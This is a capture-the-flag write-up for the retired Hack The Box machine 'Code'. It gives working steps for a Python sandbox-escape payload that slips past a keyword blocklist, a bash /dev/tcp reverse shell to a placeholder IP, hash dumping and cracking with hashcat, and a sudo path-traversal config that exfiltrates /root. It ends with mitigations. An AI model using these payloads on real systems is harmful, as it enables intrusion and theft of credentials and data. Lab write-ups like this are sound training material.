---
machine: Code
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, python, sandbox-escape, bcrypt, backy, sudo]
---

# Code — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A Python editor in the browser (Flask on 5000) with a **keyword blocklist**: `import`, `os`, `subprocess`, `eval`, `__`… The filter is textual, but the interpreter still holds every loaded class, so the sandbox is escaped by enumerating subclasses and calling `subprocess.Popen` by index. Shell as `app-production`; the app's SQLite holds `martin`'s bcrypt, and escalation is `sudo` over `backy.sh`, whose JSON config accepts traversal and archives `/root`.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh   OpenSSH 9.x
5000/tcp  http  Flask (Python Playground)
```

The app runs whatever you paste and returns the output; a banned word triggers a filter error.

## Foothold: escaping the blocklist

The filter matches strings, not objects. `().__class__` reaches every loaded class: find where `Popen` sits and call it.

```python
# locate Popen's index in the victim's runtime
for i, c in enumerate(().__class__.__mro__[-1].__subclasses__()):
    if c.__name__ == "Popen":
        print(i)
```

If `__` is banned, build the name with `getattr` and string concatenation:

```python
g = getattr
base = g(g(() , "_"*2 + "class" + "_"*2), "_"*2 + "mro" + "_"*2)()[-1]
P = g(base, "_"*2 + "subclasses" + "_"*2)()[317]
P(["bash", "-c", "bash -i >& /dev/tcp/<IP>/4444 0>&1"])
```

```bash
nc -lvnp 4444
```

```text
app-production@code:~$
```

## Pivot to user

```bash
ls /var/www/app/instance/
sqlite3 /var/www/app/instance/database.db "select username, password from users;"
```

```text
martin | $2y$...  (or MD5, depending on the build)
```

Check the prefix before picking the `hashcat` mode: bcrypt is `-m 3200`, MD5 is `-m 0`.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
ssh martin@<IP>
```

## Escalation: backy and its config

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/backy.sh
```

`backy.sh` reads a JSON with `directories_to_archive` and tars it. Validation requires the path to start with `/home` or `/var` and strips `../` only once: with `....//` the strip leaves `../` behind and the `tar` ends up reading `/root`.

```bash
mkdir -p /tmp/exf && cd /tmp/exf
cat > cfg.json <<'EOF'
{
  "destination": "/tmp/exf/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": ["/home/....//root"]
}
EOF
sudo /usr/bin/backy.sh /tmp/exf/cfg.json
ls /tmp/exf
```

The `.tar.bz2` yields `root.txt` and, when present, `/root/.ssh/id_rsa`.

## Evidence (redacted)

```text
/home/martin/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lessons

- A keyword **blocklist** is not a sandbox: if the runtime exposes `object`, every filter is decorative.
- bcrypt hashes from an app's SQLite fall to dictionary plus rules, and app accounts tend to reuse passwords.
- `sudo` over a script that consumes configuration means `sudo` over whatever that config controls.
- Mitigation: `RestrictedPython` with AST validation, a container with no network, `sudo` with fixed arguments, and path checks via `realpath`.
